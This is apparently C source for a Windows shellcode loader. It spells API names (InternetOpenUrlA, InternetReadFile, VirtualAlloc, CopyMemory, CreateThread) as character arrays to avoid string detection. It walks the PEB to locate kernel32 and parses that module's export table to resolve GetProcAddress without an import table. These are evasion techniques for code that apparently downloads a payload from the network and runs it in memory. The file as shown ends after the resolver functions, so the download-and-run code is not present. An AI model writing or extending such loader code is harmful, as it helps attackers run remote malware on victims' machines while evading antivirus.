#include <Windows.h>
#include <WinInet.h>

#define var1 { 'I','n','t','e','r','n','e','t','R','e','a','d','F','i','l','e',0 }
#define var2 { 'I','n','t','e','r','n','e','t','O','p','e','n','U','r','l','A',0 }
#define var3 { 'I','n','t','e','r','n','e','t','O','p','e','n','A',0 }
#define var5 { 'V','i','r','t','u','a','l','A','l','l','o','c',0 }
#define var6 { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t',0 }
#define var7 { 'C','o','p','y','M','e','m','o','r','y',0 }
#define var8 { 'C','r','e','a','t','e','T','h','r','e','a','d',0 }
#define var9 { 'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t',0 }
#define var10 { 'L','o','a','d','L','i','b','r','a','r','y','A',0 }
#define var12 { 'M','e','s','s','a','g','e','B','o','x','A',0 }
#define var13 { 'R','e','g','O','p','e','n','K','e','y','E','x','W',0 }
#define var14 { 'I','n','t','e','r','n','e','t','S','e','t','S','t','a','t','u','s','C','a','l','l','b','a','c','k',0 };

#define var11 { 'w','s','p','r','i','n','t','f','A',0 }
#define format_data { '%', 's', '%', 's', '%', 's', '%', 's', '%', 's', '%', 's', '%', 's', '%', 's', '%', 's', '%', 's', '%', 's', '%', 's', '%', 's', '%', 's', '%', 's', '%', 's', '%', 's', '%', 's', '%', 's', '%', 's', '%', 's', '%', 's', '%', 's', '%', 's', '%', 's', '%', 's',0 }

#define user32dll { 'U','s','e','r','3','2','.','d','l','l',0 }
#define kernel32dll { 'K','e','r','n','e','l','3','2','.','d','l','l',0 }
#define wininetdll { 'W','i','n','i','n','e','t','.','d','l','l',0 }
#define Advapi32 { 'A','d','v','a','p','i','3','2','.','d','l','l',0 }

#define size 1024 * 1024

typedef LONG(WINAPI* REGOPENKEYEXA)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
typedef LONG(WINAPI* REGQUERYVALUEEXA)(HKEY, LPCSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
typedef LONG(WINAPI* REGCLOSEKEY)(HKEY);


typedef INTERNET_STATUS_CALLBACK(WINAPI* FN_InternetSetStatusCallback)(
	_In_ HINTERNET hInternet,
	_In_opt_ INTERNET_STATUS_CALLBACK lpfnInternetCallback
	);

typedef int (WINAPIV* FN_wsprintfA)(
	_Out_ LPSTR,
	_In_ _Printf_format_string_ LPCSTR,
	...);

typedef HMODULE(WINAPI* FN_LoadLibraryA)(
	_In_ LPCSTR lpLibFileName
	);

typedef FARPROC(WINAPI* FN_GetProcAddress)(
	_In_ HMODULE hModule,
	_In_ LPCSTR lpProcName
	);

typedef int (WINAPI* FN_MessageBoxA)(
	_In_opt_ HWND hWnd,
	_In_opt_ LPCSTR lpText,
	_In_opt_ LPCSTR lpCaption,
	_In_ UINT uType);

typedef LPVOID HINTERNET;

typedef HINTERNET(WINAPI* FN_InternetOpenA)(
	_In_ LPCTSTR lpszAgent,
	_In_ DWORD   dwAccessType,
	_In_ LPCTSTR lpszProxyName,
	_In_ LPCTSTR lpszProxyBypass,
	_In_ DWORD   dwFlags
	);

typedef HINTERNET(WINAPI* FN_InternetOpenUrlA)(
	_In_ HINTERNET hInternet,
	_In_ LPCSTR lpszUrl,
	_In_reads_opt_(dwHeadersLength) LPCSTR lpszHeaders,
	_In_ DWORD dwHeadersLength,
	_In_ DWORD dwFlags,
	_In_opt_ DWORD_PTR dwContext
	);

typedef BOOL(WINAPI* FN_InternetReadFile)(
	_In_ HINTERNET hFile,
	_Out_writes_bytes_(dwNumberOfBytesToRead) __out_data_source(NETWORK) LPVOID lpBuffer,
	_In_ DWORD dwNumberOfBytesToRead,
	_Out_ LPDWORD lpdwNumberOfBytesRead
	);

typedef LPVOID (WINAPI* FN_VirtualAlloc)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect
	);

typedef void (WINAPI* Fn_CopyMemory)(
	_In_       PVOID  Destination,
	_In_ const VOID* Source,
	_In_       SIZE_T Length
);

typedef HANDLE (WINAPI* FN_CreateThread)(
	_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
	_In_ SIZE_T dwStackSize,
	_In_ LPTHREAD_START_ROUTINE lpStartAddress,
	_In_opt_ __drv_aliasesMem LPVOID lpParameter,
	_In_ DWORD dwCreationFlags,
	_Out_opt_ LPDWORD lpThreadId
);

typedef DWORD (WINAPI* FN_WaitForSingleObject)(
	_In_ HANDLE hHandle,
	_In_ DWORD dwMilliseconds
);

typedef struct _UNICODE_STR
{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR pBuffer;
} UNICODE_STR, * PUNICODE_STR;

typedef struct _LDR_DATA_TABLE_ENTRY
{
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STR FullDllName;
	UNICODE_STR BaseDllName;
	ULONG Flags;
	SHORT LoadCount;
	SHORT TlsIndex;
	LIST_ENTRY HashTableEntry;
	ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA
{
	DWORD dwLength;
	DWORD dwInitialized;
	LPVOID lpSsHandle;
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
	LPVOID lpEntryInProgress;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _PEB_FREE_BLOCK
{
	struct _PEB_FREE_BLOCK* pNext;
	DWORD dwSize;
} PEB_FREE_BLOCK, * PPEB_FREE_BLOCK;

typedef struct __PEB
{
	BYTE bInheritedAddressSpace;
	BYTE bReadImageFileExecOptions;
	BYTE bBeingDebugged;
	BYTE bSpareBool;
	LPVOID lpMutant;
	LPVOID lpImageBaseAddress;
	PPEB_LDR_DATA pLdr;
	LPVOID lpProcessParameters;
	LPVOID lpSubSystemData;
	LPVOID lpProcessHeap;
	PRTL_CRITICAL_SECTION pFastPebLock;
	LPVOID lpFastPebLockRoutine;
	LPVOID lpFastPebUnlockRoutine;
	DWORD dwEnvironmentUpdateCount;
	LPVOID lpKernelCallbackTable;
	DWORD dwSystemReserved;
	DWORD dwAtlThunkSListPtr32;
	PPEB_FREE_BLOCK pFreeList;
	DWORD dwTlsExpansionCounter;
	LPVOID lpTlsBitmap;
	DWORD dwTlsBitmapBits[2];
	LPVOID lpReadOnlySharedMemoryBase;
	LPVOID lpReadOnlySharedMemoryHeap;
	LPVOID lpReadOnlyStaticServerData;
	LPVOID lpAnsiCodePageData;
	LPVOID lpOemCodePageData;
	LPVOID lpUnicodeCaseTableData;
	DWORD dwNumberOfProcessors;
	DWORD dwNtGlobalFlag;
	LARGE_INTEGER liCriticalSectionTimeout;
	DWORD dwHeapSegmentReserve;
	DWORD dwHeapSegmentCommit;
	DWORD dwHeapDeCommitTotalFreeThreshold;
	DWORD dwHeapDeCommitFreeBlockThreshold;
	DWORD dwNumberOfHeaps;
	DWORD dwMaximumNumberOfHeaps;
	LPVOID lpProcessHeaps;
	LPVOID lpGdiSharedHandleTable;
	LPVOID lpProcessStarterHelper;
	DWORD dwGdiDCAttributeList;
	LPVOID lpLoaderLock;
	DWORD dwOSMajorVersion;
	DWORD dwOSMinorVersion;
	WORD wOSBuildNumber;
	WORD wOSCSDVersion;
	DWORD dwOSPlatformId;
	DWORD dwImageSubsystem;
	DWORD dwImageSubsystemMajorVersion;
	DWORD dwImageSubsystemMinorVersion;
	DWORD dwImageProcessAffinityMask;
	DWORD dwGdiHandleBuffer[34];
	LPVOID lpPostProcessInitRoutine;
	LPVOID lpTlsExpansionBitmap;
	DWORD dwTlsExpansionBitmapBits[32];
	DWORD dwSessionId;
	ULARGE_INTEGER liAppCompatFlags;
	ULARGE_INTEGER liAppCompatFlagsUser;
	LPVOID lppShimData;
	LPVOID lpAppCompatInfo;
	UNICODE_STR usCSDVersion;
	LPVOID lpActivationContextData;
	LPVOID lpProcessAssemblyStorageMap;
	LPVOID lpSystemDefaultActivationContextData;
	LPVOID lpSystemAssemblyStorageMap;
	DWORD dwMinimumStackCommit;
} _PEB, * _PPEB;

ULONG_PTR GetKernel32DLL(ULONG_PTR uiValueA) {
	while (uiValueA) {
		if (((WORD*)((PLDR_DATA_TABLE_ENTRY)uiValueA)->BaseDllName.pBuffer)[12] == 0) {
			return (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)->DllBase;
		}
		uiValueA = *(UINT_PTR*)uiValueA;
	}
}

FARPROC GetProcAddress_Func(ULONG_PTR dwKernelBase) {
	
#if defined(_AMD64_)
	PIMAGE_NT_HEADERS64 lpNtHeader = (PIMAGE_NT_HEADERS64)((ULONG64)dwKernelBase + ((PIMAGE_DOS_HEADER)dwKernelBase)->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY lpExports = (PIMAGE_EXPORT_DIRECTORY)((ULONG64)dwKernelBase + (ULONG64)lpNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	PDWORD lpdwFunName = (PDWORD)((ULONG64)dwKernelBase + (ULONG64)lpExports->AddressOfNames);
#else
	PIMAGE_NT_HEADERS32 lpNtHeader = (PIMAGE_NT_HEADERS32)((DWORD)dwKernelBase + ((PIMAGE_DOS_HEADER)dwKernelBase)->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY lpExports = (PIMAGE_EXPORT_DIRECTORY)(dwKernelBase + (DWORD)lpNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	PDWORD lpdwFunName = (PDWORD)(dwKernelBase + (DWORD)lpExports->AddressOfNames);
#endif

	for (DWORD dwLoop = 0; dwLoop < lpExports->NumberOfNames; dwLoop++) {
		char* pFunName = (char*)(dwKernelBase + *(DWORD*)(lpdwFunName + dwLoop));
		if (pFunName[0] == 'G' && pFunName[13] == 's' && pFunName[14] == 0)
#if defined(_AMD64_)
			return (FARPROC)(((PDWORD)((ULONG64)dwKernelBase + (ULONG64)lpExports->AddressOfFunctions))[((PWORD)((ULONG64)dwKernelBase + (ULONG64)lpExports->AddressOfNameOrdinals))[dwLoop]] + (ULONG64)dwKernelBase);
#else
			return (FARPROC)(((PDWORD)((DWORD)dwKernelBase + (DWORD)lpExports->AddressOfFunctions))[((PWORD)((DWORD)dwKernelBase + (DWORD)lpExports->AddressOfNameOrdinals))[dwLoop]] + (DWORD)dwKernelBase);
#endif
	}
}
